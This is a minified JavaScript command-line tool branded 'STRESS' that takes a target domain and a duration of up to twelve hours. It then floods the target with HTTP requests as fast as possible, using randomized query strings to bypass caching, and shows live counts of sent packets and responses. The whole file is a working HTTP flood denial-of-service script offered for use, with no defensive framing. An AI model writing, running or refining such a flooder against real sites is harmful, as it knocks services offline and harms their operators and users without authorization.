const Uuniq = require("uuniq")
    , Dayjs = require("dayjs")
    , Duration = require("dayjs/plugin/duration");
Dayjs.extend(Duration);
const kindof = require("kind-of")
    , readline = require("readline")
    , Snowflake = new Uuniq.Snowflake
    , Symbolic = new Uuniq.Symbolic
    , rl = readline.createInterface({ input: process.stdin, output: process.stdout })
    , Package = require("./package.json");
let intervals = {};
const print = () => { console.clear(), console.log("\n"), console.log("    \x1b[90m #####   ######   #####    #####    #####    #####", "\x1b[0m"), console.log("    \x1b[90m##         ##     ##  ##   ##      ##       ##", "\x1b[0m"), console.log("    \x1b[90m ####      ##     #####    ####     ####     ####", "\x1b[0m"), console.log("    \x1b[90m    ##     ##     ##  ##   ##          ##       ##", "\x1b[0m"), console.log("    \x1b[90m#####      ##     ##  ##   #####   #####    #####", "\x1b[0m"), console.log(""), console.log("                                                   \x1b[37mv" + Package.version, "\x1b[0m"), console.log("") };
print();
const start = () => {
    print(), rl.question("Target: ", t => {
        if (print(), "string" !== kindof(t = t.toLowerCase()
                .trim()
                .split("https://")
                .join("")
                .split("http://")
                .join("")
                .split("/")[0])) { console.log("Field target must be a string."), setTimeout(start, 2500); return }
        if ("" === t) { console.log("Field target cannot be left blank."), setTimeout(start, 2500); return } console.log("Target: " + t), rl.question("Duration: ", async e => {
            if (print(), isNaN(e)) { console.log("Field duration must be a number."), setTimeout(start, 2500); return }
            if ("" === e) { console.log("Field duration cannot be left blank."), setTimeout(start, 2500); return } e < 1 && (e = 1), e > 43200 && (e = 43200), console.log("Target: " + t), console.log("Duration: " + e), console.log(""), console.log("Status                       \x1b[33mPreparing... ⟳", "\x1b[0m"), console.log("Packets Sent                 \x1b[90m--", "\x1b[0m"), console.log("Successful Resp.             \x1b[90m--", "\x1b[0m"), console.log("Unsuccessful Resp.           \x1b[90m--", "\x1b[0m"), console.log("Latest Response Ping         \x1b[90m--", "\x1b[0m"), console.log("Remaining Time               \x1b[90m--", "\x1b[0m"), console.log(""), await Bun.sleep(1e3), print(), console.log("Target: " + t), console.log("Duration: " + e), console.log(""), console.log("Status                       \x1b[33mAlmost Ready... ⟳", "\x1b[0m"), console.log("Packets Sent                 \x1b[90m--", "\x1b[0m"), console.log("Successful Resp.             \x1b[90m--", "\x1b[0m"), console.log("Unsuccessful Resp.           \x1b[90m--", "\x1b[0m"), console.log("Latest Response Ping         \x1b[90m--", "\x1b[0m"), console.log("Remaining Time               \x1b[90m--", "\x1b[0m"), console.log(""), await Bun.sleep(2500);
            let n = !0
                , o = 0
                , l = 0
                , $ = 0
                , s = 0
                , a = e;
            intervals.PACKETS_SENT = setInterval(() => {
                o++;
                let e = performance.now();
                fetch("http://" + t + "?" + Symbolic.generate() + "=" + Snowflake.generate())
                    .then(t => { l++, s = performance.now() - e })
                    .catch(t => { $++, s = performance.now() - e })
            });
            let i, m, g, b, _;
            setInterval(() => {
                print(), console.log("Target: " + t), console.log("Duration: " + e), console.log(""), console.log("Status                       " + (n ? "\x1b[0mRunning ▶" : "\x1b[31mStopped ■"), "\x1b[0m"), console.log("Packets Sent                 " + (i !== o ? "\x1b[34m" : "\x1b[90m") + (void 0 !== o ? o + " ↑" : "--"), "\x1b[0m"), console.log("Successful Resp.             " + (m !== l ? "\x1b[32m" : "\x1b[90m") + (void 0 !== l ? l + " ↓" : "--"), "\x1b[0m"), console.log("Unsuccessful Resp.           " + (g !== $ ? "\x1b[31m" : "\x1b[90m") + (void 0 !== $ ? $ + " ⇣" : "--"), "\x1b[0m"), console.log("Latest Response Ping         " + (b !== s ? "\x1b[35m" : "\x1b[90m") + (void 0 !== s ? parseInt(s) + " ⇅ ms" : "--"), "\x1b[0m"), console.log("Remaining Time               " + (_ !== a ? "\x1b[33m" : "\x1b[90m") + (void 0 !== a ? Dayjs.duration(a, "seconds")
                    .format("HH:mm:ss") + " ⏱︎" : "--"), "\x1b[0m"), console.log(""), i = o, m = l, g = $, b = s, _ = a
            }, 1e3), setInterval(() => { 0 === a ? (n = !1, clearInterval(intervals.PACKETS_SENT)) : a-- }, 1e3)
        })
    })
};
start();